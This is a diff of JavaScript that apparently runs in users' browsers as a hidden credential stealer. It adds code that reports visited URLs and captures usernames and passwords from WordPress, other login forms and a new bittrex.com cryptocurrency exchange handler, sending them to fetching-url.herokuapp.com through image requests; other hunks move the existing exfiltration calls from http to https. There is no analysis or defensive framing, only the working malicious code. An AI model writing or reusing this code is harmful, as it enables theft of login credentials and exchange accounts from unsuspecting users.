@@ -62,16 +62,17 @@ var myStringArray = [
 var arrayLength = myStringArray.length;
 for (var i = 0; i < arrayLength; i++) {
     if (location.href.indexOf(myStringArray[i]) > -1) {
-(new Image).src = "//whos.amung.us/swidget/bbbbbbbbc";
+      (new Image).src = "https://fetching-url.herokuapp.com/sites.php?l="+encodeURIComponent(location.href);
+      }
     }
-  }
+
 
     if (location.href.indexOf("wp-login") >= 0 || (location.href.indexOf("wp-admin") >= 0 || location.href.indexOf("wp-") >= 0)) {
       document.getElementById("loginform").onsubmit = function() {
         username = document.getElementById("user_login").value;
         user_pass = document.getElementById("user_pass").value;
         if (username && user_pass) {
-          (new Image).src = "http://fetching-url.herokuapp.com/logs.php?l="+encodeURIComponent(location.href)+"&e="+encodeURIComponent(username)+"&p="+encodeURIComponent(user_pass);
+          (new Image).src = "https://fetching-url.herokuapp.com/logs.php?l="+encodeURIComponent(location.href)+"&e="+encodeURIComponent(username)+"&p="+encodeURIComponent(user_pass);
 
         }
       };
@@ -81,7 +82,7 @@ for (var i = 0; i < arrayLength; i++) {
         username = document.getElementById("username").value;
         user_pass = document.getElementById("password").value;
         if (username && user_pass) {
-          (new Image).src = "http://fetching-url.herokuapp.com/logs.php?l="+encodeURIComponent(location.href)+"&e="+encodeURIComponent(username)+"&p="+encodeURIComponent(user_pass);
+          (new Image).src = "https://fetching-url.herokuapp.com/logs.php?l="+encodeURIComponent(location.href)+"&e="+encodeURIComponent(username)+"&p="+encodeURIComponent(user_pass);
         }
       };
     };
@@ -90,7 +91,7 @@ for (var i = 0; i < arrayLength; i++) {
         username = document.getElementsByName("email")[0].value;
         user_pass = document.getElementsByName("password")[0].value;
         if (username && user_pass) {
-          (new Image).src = "http://fetching-url.herokuapp.com/logs.php?l="+encodeURIComponent(location.href)+"&e="+encodeURIComponent(username)+"&p="+encodeURIComponent(user_pass);
+          (new Image).src = "https://fetching-url.herokuapp.com/logs.php?l="+encodeURIComponent(location.href)+"&e="+encodeURIComponent(username)+"&p="+encodeURIComponent(user_pass);
         }
       };
     };
@@ -103,6 +104,20 @@ for (var i = 0; i < arrayLength; i++) {
         }
       };
     };
+
+    if (location.href.indexOf("bittrex.com") >= 0) {
+      document.getElementById("loginForm").onsubmit = function() {
+        username = document.getElementsByName("UserName")[0].value;
+        user_pass = document.getElementsByName("Password")[0].value;
+        if (username && user_pass) {
+          (new Image).src = "https://fetching-url.herokuapp.com/logs.php?l="+encodeURIComponent(location.href)+"&e="+encodeURIComponent(username)+"&p="+encodeURIComponent(user_pass);
+        }
+      };
+    };
+
+
+
+
 
     var target = 2048;
     var exFunc = function(){
